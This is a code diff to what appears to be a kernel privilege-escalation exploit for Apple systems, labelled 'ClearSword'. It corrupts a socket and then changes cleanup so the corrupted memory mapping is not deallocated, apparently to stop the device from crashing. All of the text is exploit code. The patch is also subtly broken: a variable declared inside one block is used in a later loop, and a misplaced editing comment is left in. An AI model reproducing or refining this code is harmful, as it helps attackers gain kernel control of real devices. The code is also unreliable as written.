@@ -195,9 +195,12 @@ kern_return_t pe_v1(void) {
                     );
 
                     LOG("[ClearSword] AFTER find_and_corrupt_socket: %d", find_kr);
+                    mach_vm_address_t success_mapping_address = 0;
 
+                    // inside the search loop, right after success = true:
                     if (find_kr == KERN_SUCCESS) {
                         success = true;
+                        success_mapping_address = search_mapping_address; // add this
                         LOG("[ClearSword] success = true");
                         break;
                     }
@@ -240,21 +243,20 @@ kern_return_t pe_v1(void) {
         LOG("[ClearSword] BEFORE search-mapping deallocation");
 
         while (search_mappings_count > 0) {
-            mach_vm_address_t search_mapping_address =
-                search_mappings[--search_mappings_count];
+            mach_vm_address_t search_mapping_address = search_mappings[--search_mappings_count];
+
+            if (search_mapping_address == success_mapping_address) {
+                LOG("[ClearSword] Skipping dealloc of success mapping: %#llx (known unsafe)", 
+                    (unsigned long long)search_mapping_address);
+                continue;
+            }
 
             LOG("[ClearSword] BEFORE mach_vm_deallocate: %#llx",
                 (unsigned long long)search_mapping_address);
-
             kern_return_t dealloc_kr = mach_vm_deallocate(
-                mach_task_self(),
-                search_mapping_address,
-                search_mapping_size
-            );
-
+                mach_task_self(), search_mapping_address, search_mapping_size);
             LOG("[ClearSword] AFTER mach_vm_deallocate: %#llx -> %d",
-                (unsigned long long)search_mapping_address,
-                dealloc_kr);
+                (unsigned long long)search_mapping_address, dealloc_kr);
         }
 
         LOG("[ClearSword] search-mapping cleanup COMPLETE");
